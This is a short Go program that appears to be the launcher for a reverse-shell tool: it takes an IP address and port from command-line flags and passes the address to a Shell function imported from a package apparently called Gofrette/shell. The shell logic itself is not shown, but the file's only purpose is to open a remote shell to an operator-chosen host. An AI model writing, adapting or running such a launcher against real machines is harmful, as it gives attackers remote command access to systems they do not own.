package main

import (
	"flag"
	"fmt"
	s "github.com/Enelg52/Gofrette/shell"
)

func main() {
	ipaddr := flag.String("a","127.0.0.1","ip")
	port := flag.Int("p",1234,"port")
	flag.Parse()
	address := fmt.Sprintf("%s:%d",*ipaddr, *port)

	s.Shell(address)
}



